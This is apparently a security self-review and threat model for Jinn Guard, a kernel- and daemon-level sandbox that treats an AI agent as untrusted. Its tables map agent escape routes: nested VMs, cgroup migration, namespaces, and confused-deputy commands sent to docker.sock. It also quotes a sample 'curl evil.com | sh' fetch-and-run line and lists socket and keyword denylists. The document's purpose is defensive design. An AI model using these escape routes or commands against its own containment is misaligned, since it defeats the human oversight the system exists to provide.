# Jinn Guard — Threat Model & Security Review

**Status:** v1.0.0-rc1 · validated research prototype / controlled-pilot MVP
**Scope of this document:** the security model, trust boundaries, adversary
assumptions, attack surface, and the threat→mitigation mapping for the system as
it actually ships today. Every mitigation below is tied to a concrete control in
the code and, where possible, to an automated test or a live validation result.

> This is a structured **self-review**, not a third-party audit. It is written to
> be checked: a reviewer can run `scripts/run_professor_validation.sh` and map
> each PASS back to the rows below. Independent audit remains the open item
> (see §9). The historical white-box audit that first surfaced JG-ADV-2026-001 and
> JG-ADV-2026-002 is preserved in [`red-team-report.md`](red-team-report.md); note
> that report describes an aspirational mTLS identity model — the shipped system
> uses HMAC-SHA256 over a local Unix-domain socket, documented accurately here.
>
> **Note on identifiers:** `JG-ADV-*` are internal, self-identified advisory IDs, not CVE records issued by a CNA.

---

## 1. System overview and trust boundaries

Jinn Guard mediates the actions of an autonomous AI agent at the operating-system
boundary, treating the agent as **untrusted**. There are two enforcement planes:

1. **User-space governance daemon (`ts_cli`).** An agent (or a broker acting for
   it) connects over a local Unix-domain socket and submits HMAC-signed
   *proposals*. The daemon runs each proposal through a fixed gate chain
   (`main.rs`, STEP 1–16) and returns ALLOW/DENY with an auditable reason.
2. **Kernel eBPF-LSM enforcement.** Five LSM hooks (`bprm_check_security`,
   `socket_connect`, `socket_sendmsg`, `inode_create`, `inode_unlink`) make
   synchronous allow/deny decisions in the kernel, independent of any cooperation
   from the agent process.

### Trust boundaries

| Boundary | Trusted side | Untrusted side |
|---|---|---|
| Unix-domain socket | The daemon + the HMAC secret | The connecting agent/broker |
| `bprm`/socket/inode LSM hooks | Kernel + installed policy maps | Every governed user-space process |
| HMAC secret | Kernel keyring / `--secret-file` (root-owned) | The agent |
| cgroup scope | The operator's session + system services | The governed agent cgroup |

The **operator** (the human running the host) is trusted and is, by explicit
design, never subject to kernel denial (see §6).

---

## 2. Assets and security goals

| Asset | Goal |
|---|---|
| Host integrity (filesystem, processes) | An agent cannot create/delete files or exec binaries outside policy |
| Network egress | An agent cannot reach denied destinations |
| Decision integrity | Every decision is authenticated, replay-proof, and totally-ordered per agent |
| Auditability | Every decision is recorded in a tamper-evident, hash-chained log |
| Operator availability | Enforcement can **never** lock the operator out of their own machine |
| Determinism | Identical inputs yield identical decisions; the adaptive layer only ever tightens |

---

## 3. Adversary model

**In scope — a malicious or compromised agent that can:**
- Open the Unix socket and send arbitrary bytes / malformed frames.
- Replay, reorder, or tamper with previously-seen proposals.
- Claim arbitrary `agent_id`s, including unknown or empty/anonymous identities.
- Attempt intent injection, delegation forgery, and quota-exhaustion races.
- Spawn child processes, attempt network connections, and create/delete files
  directly (bypassing the proposal path entirely) to test the kernel plane.
- Attempt to bypass `execve` allowlists via interpreter chains.
- Attempt filesystem-policy bypass via relative/odd paths.

**Out of scope (explicit assumptions):**
- An adversary who is already **root** on the host, or who can load kernel
  modules / disable LSM, is out of scope — they are above the enforcement plane.
- Physical access and firmware/boot-level attacks.
- Side channels (timing, cache) against the Z3 layer.
- The correctness of the Linux kernel, eBPF verifier, and HMAC primitive itself.
- Supply-chain compromise of the build toolchain.

---

## 4. Attack surface

| Surface | Entry point | Primary control |
|---|---|---|
| IPC framing | 5-byte header + length-prefixed payload (`main.rs` STEP 1–2) | Bounded reads, version tag, explicit length cap |
| Proposal authenticity | `SignedEnvelope` HMAC-SHA256 (STEP 3–4) | Constant-time MAC verify against keyring/secret-file key |
| Identity | `agent_id` from inner JSON + `SO_PEERCRED` peer creds | Unknown/anonymous gates (STEP 7–8) |
| Ordering | Per-`(pid, start_time)` lineage sequence counter (STEP 6) | Monotonic replay gate |
| Authorization | Intent allowlist, runtime policy, quota (STEP 9–11) | Per-agent policy, fail-closed |
| Risk/ceiling | Adaptive penalty + Z3 invariants + hard ceiling (STEP 12–13) | Deterministic, tighten-only |
| Kernel execve | `bprm_check_security` | In-kernel allowlist, cgroup-scoped |
| Kernel network | `socket_connect`, `socket_sendmsg` | In-kernel IP denylist, cgroup-scoped |
| Kernel filesystem | `inode_create`, `inode_unlink` | Full-path resolution + denylist, cgroup-scoped |

---

## 5. Threats → mitigations (with evidence)

Evidence keys: **UT** = unit test, **IT** = integration test, **SW** = swarm-attack
suite, **K** = live kernel validation (Tier 4), **D** = Docker mandatory-mediation
(Tier 2), **AO** = live audit-only kernel (Tier 3).

| # | Threat | Mitigation | Control | Evidence |
|---|--------|-----------|---------|----------|
| T1 | Forged/tampered proposal | HMAC-SHA256 over inner payload; mismatch → DENY before any gate | `main.rs` STEP 3–4 | SW, UT |
| T2 | Replay / reorder of a valid proposal | Monotonic sequence per `(pid,start_time)` lineage key → `DENY_REPLAY_ATTACK` | STEP 6 | SW, IT |
| T3 | Anonymous / empty identity | Empty/unparseable `agent_id` denied | STEP 7 | SW |
| T4 | Unknown agent (not in policy) | No matching agent node → DENY | STEP 8 | SW |
| T5 | Intent injection (action outside declared intents) | Per-agent intent allowlist | STEP 9 | SW, UT |
| T6 | Delegation forgery | Delegation/lineage checks reject forged chains | STEP 5–6, governance | SW |
| T7 | Quota-exhaustion race | Slot reserved under lock before decision | STEP 11 | SW, UT |
| T8 | Invariant violation slips through | Z3 SMT invariants + hard global safety ceiling | STEP 12–13 | UT (Z3), IT |
| T9 | Fail-open via "out-of-scope/immune" fast-path | Fast-paths moved **after** the full gate chain (STEP 11.5) | STEP 11.5 | IT, SW (regression fixed) |
| T10 | Direct host action bypassing the proposal path | Kernel LSM enforces independently of user-space cooperation | 5 LSM hooks | K, D |
| T11 | execve allowlist bypass via interpreters (JG-ADV-2026-001) | Governed agents denied known interpreters → `DENY_INTERPRETER_NOT_ALLOWED` | `interpreter_bypass_denied()` | UT |
| T12 | Filesystem policy bypass via relative paths (JG-ADV-2026-002) | Kernel resolves full absolute path before the denylist check | `jg_read_dentry_path()` | AO, K |
| T13 | Repeat offender keeps probing | Deterministic, bounded, tighten-only risk penalty | `adaptive_risk_penalty()` (M6) | UT |
| T14 | Mandatory mediation bypass | Locked agent: no network, RO fs, all caps dropped, seccomp, socket-only | Docker compose profile | D (7/7 probes) |
| T15 | Audit tampering | Hash-chained audit log | governance audit log | UT |

### CVE log

| CVE | Severity | Status | Resolution |
|---|---|---|---|
| **JG-ADV-2026-002** — filesystem policy bypass via relative paths | Critical | **Fixed** | Kernel-side full-path resolution (`jg_read_dentry_path`, depth-12 dentry walk). Live-verified audit-only (Tier 3) and armed (Tier 4). Residual (telemetry only since #52): sub-mount path *strings* are mount-relative, but the decision keys on `(s_dev, i_ino)` identity, not the string (§7.1). |
| **JG-ADV-2026-001** — execve bypass via interpreter chains | High | **Mitigated** | Governed agents with an allowlist are denied known interpreters (`/bin/sh`, `/bin/bash`, `python`, …). Per-binary limits remain only as strong as the allowlist (§7). |
| **JG-ADV-2026-003** — agent impersonation via UID spoofing | Critical | **Mitigated** | Identity is authenticated as the OS user via `SO_PEERCRED` (unforgeable) **and** the application `agent_id` via HMAC-SHA256 — not a spoofable UID, closing the placeholder identity model from [`red-team-report.md`](red-team-report.md). Residual: a single shared HMAC key is not bound per-agent/UID, so any principal able to read the key can sign as any `agent_id`; per-agent secrets / `agent_id`↔UID binding tracked in §7.8 and §10. |
| **JG-ADV-2026-004** — fail-open in socket LSM enforcement (two root causes) | High | **Fixed (re-validated on AlmaLinux 9 / 5.14, Run 04)** | Surfaced on AlmaLinux 9 / kernel 5.14: `socket_connect` leaked a *variable* fraction of denied connects under load (a race), while UDP/exec/file held. `setenforce 0` ruled out SELinux; an **incremental standalone reproducer** (`bpf/probe/connect_min/`, branch `probe/lsm-connect-min`) isolated **two independent causes** — and proved the kernel/distro were not at fault. **(1) Load-window:** hooks were attached **before** `configure_policy()` populated the deny maps (`ipv4_denylist`, `allowed_exec_paths`, `denied_*`), so operations in that window consulted an empty policy and were ALLOWED. Fixed by **populate-then-attach** — `AyaLsmMonitor::load` loads programs *without* attaching; the new `attach_all()` runs only after `configure_policy()` (`ebpf_monitor.rs`, `main.rs`). **(2) `sock->type` width bug:** the connect/sendmsg hooks read the kernel's 2-byte `short sock->type` with `bpf_core_read(&sock_type, sizeof(int)=4, …)`, pulling 2 adjacent **padding** bytes; when non-zero, the `sock_type != STREAM/DGRAM` gate **failed OPEN**. The probe confirmed it: an address-only hook enforced 2000/2000 deterministically, and adding *only* the `sock->type` gate reintroduced 20–55% leaks. Fixed by reading into a correctly-sized `short` (`jg_socket_connect.c`, `jg_socket_sendmsg.c`). |

---

## 6. Operator-availability analysis (anti-lockout)

The defining safety property: **enforcement can never lock the operator out.**
This was a real historical failure mode (turning off safe mode froze the
desktop). It is now addressed structurally in three layers:

1. **Safe mode (audit-only).** The kernel programs set an audit-only control bit
   **before** they attach (`ebpf_monitor.rs`); every hook returns `0` (allow)
   regardless of the computed decision. A missing control map → refusal to load
   (fail-safe). Invariant-tested (`safe_mode_invariants`). More generally, **all**
   in-kernel policy maps (scope, the audit-only bit, and every deny-list) are
   populated *before* any program attaches: `load` loads the programs and
   `attach_all` attaches them only after `configure_policy` has filled the maps,
   so a hook never enforces against an empty policy (populate-then-attach;
   closes JG-ADV-2026-004).
2. **cgroup-scoped enforcement.** Each hook calls `bpf_get_current_cgroup_id()`
   and **passes through any task not in the governed cgroup** before doing any
   work — no decision, no telemetry. The scope id is written to the map *before*
   attach, so there is never a host-wide enforcement window. Configured via
   `JINNGUARD_GOVERN_CGROUP`; default (unset) preserves prior global behavior for
   deployments that want it. **This fails safe toward the operator:** a wrong or
   too-narrow scope makes governed probes *ungoverned* (tests report `fail_open`
   and fail loudly) rather than widening to the desktop.
3. **Policy-level guards.** Base-system path prefixes are rejected at policy
   install **and** re-excluded at lookup; the operator's own processes are never
   placed under governance (`operator_safety_invariants`, M1/M3).

**Live evidence.** Tier 4 was run armed on a single-machine laptop (kernel 6.12)
with **no lockout**: 2,500 enforced operations across all five surfaces with
`fail_open=0` and `incorrect_decision=0`, while the operator session remained
fully interactive. A reboot clears all kernel state unconditionally (nothing is
persisted; no enforcing service is auto-enabled), and the validation harness
wraps armed runs in a hard 10-minute watchdog.

---

## 7. Residual risks and known limitations (disclosed)

1. **Not independently audited.** This document is a self-review. Third-party
   audit is the headline open item.
2. **Distribution coverage (three, broaden over time).** Enforcement is validated
   on Debian 13/6.12, Ubuntu 24.04/6.17, and AlmaLinux 9/5.14 (SELinux Enforcing)
   — three distros and three kernel lineages, all `fail_open=0` (BENCHMARKS-01..04).
   Broader coverage (more distros/kernels, arm64) remains open.
3. **`bpf_core_read` field-width discipline.** A `short` kernel field read into a
   wider local caused a fail-open (JG-ADV-2026-004, fixed). All current
   `bpf_core_read`/`bpf_probe_read_kernel` scalar reads were audited and match
   their source widths. Note: `denied_dir_inodes` keys on the full 64-bit
   `(s_dev, i_ino)` pair (JG #52); both halves are read at full width on the
   kernel side and resolved via `stat(2)` on the daemon side, so there is no
   truncation and no cross-superblock inode-number collision.
3. **Mount-boundary path resolution.** Inode hooks have no vfsmount, so the
   *human-readable path* reconstructed for telemetry resolves relative to a
   sub-mount's root. The **enforcement decision**, however, no longer depends on
   that string: denied directories are matched by their `(s_dev, i_ino)` identity
   (JG #52), which a bind-mount / `pivot_root` / mount-namespace remap cannot
   forge — the inode the kernel hands the hook is the real target regardless of
   the path it was reached by. Residual: identity matching covers the *parent
   directory* of create/unlink; per-file denylist entries still match on
   basename, and the telemetry path string remains sub-mount-relative.
4. **Interpreter chains (JG-ADV-2026-001).** An agent explicitly allowed to run an
   interpreter can drive other tools through it. Mitigated by denying
   interpreters for governed agents; not eliminated.
5. **Root-equivalent adversary is out of scope** by assumption (§3).
6. **HMAC secret distribution.** Security reduces to protecting the shared key
   (kernel keyring / root-owned secret file). Key rotation is not yet automated
   (tracked for productionization).
7. **DNS mediation is heuristic.** `sendmsg`-to-:53 payload inspection is
   best-effort, not a full resolver-level policy.
8. **Multi-user yes; multi-tenant isolation partial.** The daemon authenticates
   *two* independent identities per request: the calling **OS user**
   (`pid/uid/gid` read from the kernel via `SO_PEERCRED` — unforgeable) and the
   application **`agent_id`** (HMAC-SHA256). OS-user identity is enforceable
   (`deny_root_peers`, `allowed_peer_uids`) and recorded in the audit log, so on
   a shared host every decision is attributable to a real user, and an
   unprivileged user who cannot read the secret cannot forge any agent.
   **However**, `agent_id` is **not** cryptographically bound to a UID: a single
   shared HMAC key signs all agents, so any principal able to read that key
   (root or the `jinnguard` group) can sign as *any* `agent_id`. This is
   sufficient for one trust domain with ordinary users, but **not** for mutually
   distrusting tenants. Strong multi-tenant isolation requires per-agent secrets
   or an `agent_id`↔UID binding (tracked in §10). The UDS also carries no
   restrictive mode unless `--socket-mode 0660` is set; connecting is gated by
   HMAC + peer-UID regardless, but operators on shared hosts should set it.

### 7.1 Mount-boundary and TOCTOU properties (precise)

Filesystem enforcement (`inode_create` / `inode_unlink`) makes a **synchronous,
in-kernel** decision on the exact `dir` inode and `dentry` the kernel is about to
operate on. Two consequences worth stating precisely, because earlier drafts of
this document (and the README/advisory notes) described a weaker, path-string
model that JG #52 superseded:

- **The enforcement decision does not depend on a path string.** A denied
  directory is matched by its `(s_dev, i_ino)` identity (JG #52), and a denied
  per-file entry by its leaf basename. Neither is a reconstructed absolute path,
  so a bind-mount, `pivot_root`, mount-namespace remap, or symlinked access path
  **cannot relocate the target out from under the check** — the kernel hands the
  hook the real inode regardless of the name used to reach it
  (`test_kernel_inode_identity_denied_via_symlink`).
- **No check-vs-use (classic TOCTOU) window at the floor.** The decision and the
  guarded operation act on the same kernel object in the same syscall; there is
  no re-resolution between check and use, so a path swapped after the check cannot
  be substituted before the use.

What remains, stated with its failure direction and the precondition an adversary
would need:

| Residual | Failure direction | Precondition / scope |
| --- | --- | --- |
| **Telemetry path string is sub-mount-relative.** `jg_read_dentry_path` walks `d_parent` with no `vfsmount`, so a file on a sub-mount (tmpfs `/tmp` → `/x`) logs a mount-relative path. | **Observability only** — does not affect the synchronous deny decision; the async user-space request is advisory (adaptive scoring/audit), and an inode op already completed cannot be retroactively denied. | None; affects audit/forensics precision, not enforcement. |
| **Per-file denylist is basename-only when the parent dir is unresolvable.** A denied file path is matched precisely by `(parent s_dev, parent i_ino, basename)` when its parent directory resolves at load (JG #60). It falls back to basename-anywhere **only** for entries whose parent cannot be resolved at startup (relative paths, or a parent that does not yet exist). | **Fail-closed (over-block)** in the fallback case only; the precise case neither over- nor under-blocks. | None; the fallback is an availability/precision cost, never a bypass. The same load-time pinning caveat as the row below applies to the precise key. |
| **Policy-load-time inode pinning.** Denied-directory `(s_dev, i_ino)` is resolved via `stat(2)` at `configure_policy` (startup). If a denied directory's inode is *replaced* (unlinked + recreated, or its backing mount swapped) after load, the denylist holds the stale identity and the replacement is unmatched. | **Fail-open in this narrow case.** | Requires replacing a configured system directory at runtime — itself a privileged act, and creating the replacement under a governed parent is itself denied. Mitigation: re-resolve on policy reload; prefer stable system directories as denied roots. |
| **Cross-mount absolute paths in telemetry need path-family hooks.** Full global paths across mounts require `bpf_d_path` / path-family LSM hooks. | Observability only (same as row 1). | None. |

The previously-tracked "path remap fools the string denylist" concern is
**closed** by #52; the residual surface above is strictly narrower and, except for
the documented load-time pinning case, fails closed.

### Nested execution and sandbox escape

Jinn Guard's enforcement boundary is **processes in a governed cgroup, as seen by
the host kernel.** The userspace intent layer is opt-in; the floor that governs a
process which *doesn't ask* is the host BPF-LSM, applied to governed cgroups. The
guarantee therefore rests on three assumptions, and a nested execution context can
attack each one: the governed tag is **un-sheddable**, the kernel's **namespace
view is authoritative**, and **no second kernel** is introduced.

| Vector | How it escapes | Severity |
| --- | --- | --- |
| Nested VM / microVM (qemu, Firecracker, gVisor, Kata, `/dev/kvm`) | Work runs under a **second kernel**; host BPF-LSM never sees the guest's syscalls | Critical |
| cgroup migration | Process moves itself/a child to a cgroup outside `governed_scope`; LSM no longer gates it | Critical |
| User namespace (`unshare`/`clone` `CLONE_NEWUSER`) | Unprivileged agent gains in-ns "root", then creates mount/cgroup/pid namespaces | High |
| Mount namespace / `pivot_root` / bind-mount | Remaps the filesystem so a denied path looks allowed (generalizes the mount-boundary item above) | High |
| Nested container runtime (runc/podman/nspawn) | Child runs in fresh namespaces + possibly a fresh cgroup → ungoverned unless the tag is inherited | High |
| Interpreter chains (JG-ADV-2026-001) | A child interpreter performs the real work; a "soft sandbox" | Medium |

**Hardening direction (tracked in the hardening backlog and §10):**

1. **Un-sheddable governance tag — IMPLEMENTED (#49).** Governance follows the
   whole cgroup **subtree**: `jg_in_governed_scope()` matches the governed cgroup
   id *or any ancestor* (`bpf_get_current_ancestor_cgroup_id`, bounded depth), so
   a governed task that creates and migrates into a descendant cgroup stays
   governed. (Implemented via subtree matching rather than BPF task-local storage:
   the pinned aya 0.13 loader cannot load `TASK_STORAGE` maps; subtree matching is
   the equivalent guarantee with the available map types.) **Residual:** migration
   to a sibling/parent cgroup *outside* the governed subtree is still escape — the
   complementary `cgroup.procs`-write denial remains future work.
2. **Deny the nesting primitives by default for governed agents — IMPLEMENTED
   (#50).** LSM mediation now denies `mount` (`sb_mount`), `pivot_root`
   (`sb_pivotroot`), and `move_mount` for governed scope (pure kernel-floor
   deny-in-scope; audit-only downgrades to observe). **Residual:** `chroot`,
   `setns`, and namespace-creating `clone`/`unshare` flags are not yet directly
   mediated — but unprivileged userns nesting is separately neutered by #53 (item
   5), which is the capability such an `unshare(CLONE_NEWNS)` requires.
3. **Treat VM launch as a hard boundary — IMPLEMENTED (#51).** Host BPF-LSM cannot
   see inside a guest kernel, so a nested VM is the strongest escape. The
   `file_open` hook denies a governed task from opening **`/dev/kvm`**, matched by
   its fixed device identity (`MISC_MAJOR` 10, `KVM_MINOR` 232) so no path walk is
   needed; the rdev check runs before the scope check so non-KVM opens pay almost
   nothing. This collapses **all KVM-accelerated VMMs** — QEMU/KVM, Firecracker,
   Cloud Hypervisor, crosvm, Kata. A VM-capable governed agent remains **outside
   the single-host enforcement model unless a nested Jinn Guard instance governs
   the guest** (recursive governance); this is an explicit scope limit, not a
   claim. **Residual (disclosed):** (a) `/dev/vhost-*` paravirt I/O devices are not
   yet denied — they register with *dynamic* misc minors, so a fixed-rdev match is
   unreliable; they are useless without `/dev/kvm` for acceleration but enable
   vhost-backed paths in software VMs. (b) Pure software emulation (TCG/qemu, or
   gVisor's ptrace/KVM platforms in their non-KVM mode) needs no device node — but
   it requires exec of the emulator binary, already denied by the bprm allowlist
   (#4 attack surface), and offers only a slow interpreted guest the host hooks
   still observe, not a fast second kernel.
4. **Key path decisions on inode/superblock identity, not path strings —
   IMPLEMENTED (#52).** The `inode_create`/`inode_unlink` denied-directory match
   now keys on the `(s_dev, i_ino)` pair the daemon resolved via `stat(2)`, not on
   i_ino alone (collides across superblocks) or the path string (remappable). A
   bind-mount / `pivot_root` / mount-namespace remap cannot fool it: the kernel
   hands the hook the real target inode regardless of the path used to reach it.
5. **Drop nesting-enabling capabilities — IMPLEMENTED (#53).** The `capable` hook
   denies escalation capabilities (`CAP_SYS_ADMIN`, `CAP_SYS_MODULE`,
   `CAP_SYS_RAWIO`, `CAP_SYS_PTRACE`, `CAP_SYS_BOOT`, `CAP_MKNOD`) when exercised
   inside a **non-init user namespace** (`ns->level > 0`) by a governed task, with
   an init-ns fast path. This restricts the unprivileged-userns nesting an agent
   would use to manufacture in-namespace "root" and then create mount/pid/cgroup
   namespaces.
6. **Default-deny dangerous operations at the kernel floor for governed scope —
   IMPLEMENTED (#54/#55).** A nested process that never speaks the protocol still
   cannot exec off-allowlist, mount, open `/dev/kvm`, or connect outside policy
   (default-deny IPv4 egress + AF_UNIX orchestrator-socket denylist) — i.e.,
   non-cooperation is safe.
7. **Detect even where permitted (partial):** namespace/cgroup/mount/VM-device
   creation by a governed agent is a high-signal event. Denials are chain-logged
   today (#37); broader canary-style alerting on *permitted-but-suspicious*
   creation remains future work.

The high-severity namespace, mount, and VM vectors (items 1–3, 5, 6) are now
mediated at the kernel floor for governed scope. Defense-in-depth still benefits
from running governed agents **without `CAP_SYS_ADMIN`** and with unprivileged
user namespaces disabled (`kernel.unprivileged_userns_clone=0` where the workload
permits); Jinn Guard's hooks no longer *depend* on that OS hardening, but it
removes the residuals noted above (e.g. sibling-cgroup migration, `setns`).

### Confused deputy via privileged orchestrators

A distinct and **higher-severity** class than the escapes above: instead of
exercising privilege it has, a governed agent **borrows the authority of a
more-privileged, ungoverned daemon** through an IPC channel. Capability-denial
defenses (drop `CAP_SYS_ADMIN`, block `unshare`/`mount`, disable userns) do **not**
help, because the agent is not performing the privileged operation — the deputy is.

Canonical instance:

```
governed_agent ──connect()──▶ /var/run/docker.sock ──▶ dockerd (root, ungoverned cgroup)
                                                        docker run -v /:/host … 'write to host'
```

`dockerd` performs the action with root, **in its own cgroup**, which the BPF-LSM
floor — scoped to the *agent's* governed cgroup — never observes. The agent never
left its sandbox; it commanded a deputy that lives outside it.

**Current status (disclosed): the canonical AF_UNIX path is now mediated
(#55); pending validation on a BPF-LSM host.** The `socket_connect` hook now
builds a path key from the `AF_UNIX` `sun_path` and denies governed-scope
connects to a built-in denylist of orchestrator/init control sockets
(`docker.sock`, `containerd.sock`, `podman.sock`, `crio.sock`, `libvirt-sock`,
the D-Bus system bus, `systemd/private` — both `/run` and `/var/run`). `systemd`
and `dbus-daemon` remain deliberately `IMMUNE` from governance (anti-lockout):
denying the *agent's connect* does not govern the daemon, so there is no
conflict. **Residual:** exact pathname match only — abstract-namespace sockets
and socket paths bind-mounted to non-standard locations inside a container are
not yet matched; and the deputy, once reached by a non-denylisted channel, still
acts with ambient root. Viable deputies still include CI/build runners, setuid
helpers, and **privileged MCP tool servers** reachable by non-denylisted paths.

**Hardening (the control channel is the chokepoint):**

1. **Deny governed agents' IPC to privileged deputies** — **IMPLEMENTED (#55):**
   `socket_connect` denylists the AF_UNIX control sockets above for governed
   scope. Denying the agent's *connect* does **not** govern the daemon, so there
   is **no anti-lockout conflict** — the daemon stays immune; the agent simply
   cannot command it. (Companion #54: governed-scope IPv4 egress is now
   default-deny under `network_policy.default_deny`, allow-listed destinations
   plus loopback only, with IPv6 failing closed — so a non-cooperating nested
   process cannot reach the network off an allowlist either.)
2. **Deny-by-default IPC egress allowlist — IMPLEMENTED (#56).** With
   `network_policy.unix_default_deny` set, governed-scope AF_UNIX connects are
   default-deny: only `allowed_unix_sockets` (plus the Jinn Guard control socket,
   which the daemon always self-allow-lists for anti-lockout) may be reached;
   every other path, including abstract-namespace sockets, is denied. The flag is
   independent of the IPv4 `default_deny` bit, so enabling network default-deny
   never silently severs the agent's local IPC. The #55 orchestrator denylist
   still applies on top (a denylisted path is denied regardless of the allowlist).
   **Residual:** abstract-namespace sockets cannot be allow-listed by path, so
   under this mode they are unconditionally denied (acceptable for the opt-in
   deny-by-default posture; documented).
3. **Govern the deputy / propagate identity** (the complete but hard fix): the
   deputy acts under the caller's capability rather than its ambient root
   (designation = authority). Attribution across a shared daemon is genuinely hard.
4. **Detect unconditionally — IMPLEMENTED (#58).** A governed agent connecting to
   a container/VM/init control socket is a high-signal event, so it is now surfaced
   independently of the verdict: each attempt emits a `[JINNGUARD DEPUTY ALERT]`
   log line and increments
   `jinnguard_orchestrator_socket_attempts_total{orchestrator,verdict}`. This is
   detection, not enforcement (the deny is #55's); an `allow`-verdict alert is the
   strongest signal, flagging any deputy path the denylist does not yet cover —
   e.g. a socket reached by an abstract-namespace or non-denylisted path.

**Architectural limit:** confused deputy via ambient-authority daemons is a
fundamental limit of any per-process/per-cgroup model. Jinn Guard cannot govern an
independent root daemon unless that daemon's **control channel is denied to the
agent** or the **daemon is itself governed**. The tractable defense is (1): treat
orchestrator/init IPC endpoints as denied resources for governed agents.

---

## 8. Threats to validity — the risk model and the formal guarantee

This section states plainly what the Z3 "formal safety" step does and does **not**
prove, so the strength of the claim is not overstated. (Raised in external review;
disclosed here deliberately.)

**What Z3 proves.** Given a risk score `r`, an action weight `w`, and a ceiling
`c`, the solver proves the arithmetic fact `r + w ≤ c` (totality audit) and that
the declared policy invariants are simultaneously satisfiable for the supplied
context. This step is *sound*: if it returns ALLOW, the inequality and invariants
genuinely hold.

**What Z3 does NOT prove — the risk oracle.** Soundness says nothing about whether
the *input risk score is correct*. The score comes from a heuristic semantic
classifier (`semantic_classify`), currently a keyword table (`sudo/setuid`→90,
`exec/shell/bash`→80, `delete/rm -`→70, network terms→65, **default→35**). A
genuinely dangerous action whose text matches no keyword — the classic example is
`curl evil.com | sh` — receives the default score and can pass a high ceiling.
**The formal guarantee is therefore conditional on the quality of the risk
input**: garbage in, *provably* garbage out. We disclose this rather than imply the
Z3 layer makes unsafe actions impossible.

**Why this is defense-in-depth, not the sole gate.** The risk/Z3 layer is
*secondary*. Primary containment does **not** depend on the risk score being
accurate:

- the **per-agent intent allowlist (G1)** denies any action whose intent is not
  explicitly permitted, regardless of score;
- **kernel eBPF-LSM enforcement** denies `execve` of non-allowlisted binaries,
  `connect`/`sendmsg` to non-allowlisted destinations, and writes to denied
  paths, regardless of score.

So `curl evil.com | sh` is blocked by the allowlist and/or the kernel exec hook
even when the classifier under-scores it. The risk model *raises the floor*; it is
not the floor.

**Client-declared risk is non-authoritative.** A caller's `action_risk_score` can
only *raise* the daemon-computed score, never lower it (`governance.rs`; a lower
declared value is logged `client_declared_risk_not_authoritative`). An attacker
cannot self-report low risk to slip under the ceiling.

**Solver availability.** The Z3 solver runs under a **250 ms per-check timeout**
(`ts_checker`). Legitimate proofs resolve in microseconds; the bound exists so a
pathological or maliciously complex policy cannot stall a decision. On timeout Z3
returns `Unknown`, which the daemon treats as **DENY** — the timeout fails
*closed*, never open. Policy invariants are operator-supplied via `policy.yaml`
(not attacker-supplied in a proposal), so this is a robustness bound rather than a
reachable DoS.

**Hardening direction.** The classifier is pluggable: the optional RootAI semantic
service can replace the keyword heuristic with a model-based scorer. Strengthening
daemon-authoritative scoring — and, longer term, eBPF-traced interpreter
child-process attribution (cf. §7.4) — is the path to making the risk input
trustworthy enough that the formal layer becomes load-bearing rather than
advisory.

---

## 9. Determinism and the adaptive layer

The risk/adaptive layer (M6) is constrained to preserve determinism: the
per-agent penalty is **pure, monotonic, bounded (cap 40.0), non-negative, and
tighten-only**. It is applied before the Z3 invariants and the hard ceiling, and
it never loosens a decision, never touches operator/immune/out-of-scope paths,
and never makes an ALLOW out of a DENY. Properties are pinned by
`adaptive_floor_tests`. The system is therefore *adaptive yet deterministic*:
the same observation history always yields the same decision.

---

## 10. Open items before "audited GA"

| Item | Type |
|---|---|
| Independent third-party security audit | External review |
| Daemon-authoritative risk scoring (replace keyword heuristic; cf. §8) | Engineering |
| eBPF-traced interpreter child-process attribution (close JG-ADV-2026-001 chains) | Engineering |
| Multi-distribution / multi-kernel validation matrix | Engineering |
| Automated HMAC key rotation | Engineering |
| Per-agent secrets / `agent_id`↔UID binding for multi-tenant isolation (cf. §7.8) | Engineering |
| mTLS/auth for the optional MCP/remote semantic service | Engineering |
| Full effective-set deprivilege after load | Hardening |
| OpenTelemetry / push-based metrics (a loopback Prometheus `/metrics` endpoint already ships) | Operability |

**Closed post-rc1 (M7 hardening):** eBPF compilation is now gated in CI; startup
failures use structured machine-parseable exit codes; opt-in post-load
capability hardening (`no_new_privs` + bounding-set drop via
`JINNGUARD_HARDEN_CAPS=1`) reduces the daemon's post-compromise capability
without affecting enforcement.

---

## 11. How to reproduce the evidence

```bash
# Tiers 1–2 (no root): full suite + Docker mandatory mediation
bash scripts/run_professor_validation.sh
# Tier 3 (root, audit-only): kernel full-path resolution, blocks nothing
sudo bash scripts/run_professor_validation.sh
# Tier 4 (root, cgroup-scoped): real allow/deny, fail_open=0
sudo bash scripts/run_professor_validation.sh --arm
```

Each tier's PASS maps directly back to the evidence keys in §5. See
[`PROFESSOR_VALIDATION.md`](PROFESSOR_VALIDATION.md) for the per-tier breakdown.

## 12. Data protection in the audit log (GDPR / Datenschutz)

The audit log is an append-only **SHA-256 hash chain**: each entry commits to the
previous entry's hash, so any modification or deletion of past records is
detectable (integrity / accountability — Art. 5(1)(f), 5(2), 32). That
immutability collides with the **right to erasure (Art. 17)** and **storage
limitation (Art. 5(1)(e))**, which Jinn Guard resolves by keeping personal data
**out of the chain** (#61):

- **What the chain stores** is a PII-free projection: a per-install
  **subject pseudonym** (`HMAC(install-salt, uid)`, Art. 4(5) pseudonymisation),
  an opaque `pii_ref`, and a commitment `HMAC(per-record salt, PII)`. None of the
  identifying or content fields (uid/gid, executable path, command-line argv)
  appear in the chain.
- **Personal data** lives in a separate, erasable `audit_pii` store. **Erasure**
  (`erase_subject`) deletes a subject's rows together with their per-record salts.
  Because the chain only ever held an HMAC under a now-destroyed salt, the
  commitment can no longer be linked to or brute-forced against any candidate
  plaintext — **crypto-shredding**. Every chain hash still verifies
  (`verify_chain` returns the same intact result before and after erasure).
- **Right of access (Art. 15):** `read_subject_pii` returns the data still held
  for a subject. **Data minimisation (Art. 5(1)(c)):** an opt-in mode never
  persists command-line argument *values*, only their count.

**Lawful basis / residuals.** Security and abuse-prevention logging is intended to
rest on **legitimate interest (Art. 6(1)(f))**; a deployment must still set a
retention period for `audit_pii` and complete a DPIA. The subject **pseudonym is
reversible by the operator** holding the install salt (by design — it is
pseudonymisation, not anonymisation); destroying that salt anonymises all
remaining pseudonyms. `pid` is retained in the chain as low-sensitivity
operational metadata.
